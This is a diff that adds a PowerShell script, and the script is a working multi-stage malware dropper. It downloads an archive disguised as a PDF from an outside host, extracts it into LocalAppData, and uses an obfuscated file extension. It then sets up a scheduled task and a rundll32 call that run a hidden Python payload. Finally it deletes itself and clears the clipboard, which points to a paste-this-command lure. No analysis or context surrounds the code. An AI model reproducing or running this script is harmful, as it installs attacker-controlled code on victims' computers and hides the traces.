@@ -1,0 +1,20 @@
+$DOT_PYC = ([char]46)+([char]112)+([char]121)+([char]99);
+$GUID = [guid]::NewGuid();
+$APP_DATA = $env:LocalAppData;
+irm 'http://d55f0288.proxy.coursestack.com:443/?tic=2' -OutFile $APP_DATA\$GUID.pdf;
+Add-Type -AssemblyName System.IO.Compression.FileSystem;[System.IO.Compression.ZipFile]::ExtractToDirectory("$APP_DATA\$GUID.pdf", "$APP_DATA\$GUID");
+$STAGE2_PATH = Join-Path $APP_DATA $GUID;
+$TASK_NAME = "$GUID";
+$PYTHONW_PATH = "$STAGE2_PATH\pythonw.exe";
+$CPYTHON_PATH = "$STAGE2_PATH\cpython-3134.pyc";
+$SCHEDULED_TASK = New-ScheduledTaskAction -Execute $PYTHONW_PATH -Argument "`"$CPYTHON_PATH`"";
+$IN_3_MIN = (Get-Date).AddSeconds(180);
+$TRIGGER = New-ScheduledTaskTrigger -Once -At $IN_3_MIN;
+$TASK_CONFIG = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Limited;
+Register-ScheduledTask -TaskName $TASK_NAME -Action $SCHEDULED_TASK -Trigger $TRIGGER -Principal $TASK_CONFIG -Force;
+Set-Location $STAGE2_PATH;
+$NEW_CPYTHON = "cpython-3134" + $DOT_PYC;
+Rename-Item -Path "cpython-3134" -NewName $NEW_CPYTHON;
+iex ('rundll32 shell32.dll,ShellExec_RunDLL "' + $STAGE2_PATH + '\pythonw" "' + $STAGE2_PATH + '\'+ $NEW_CPYTHON + '"');
+Remove-Item $MyInvocation.MyCommand.Path -Force;
+Set-Clipboard
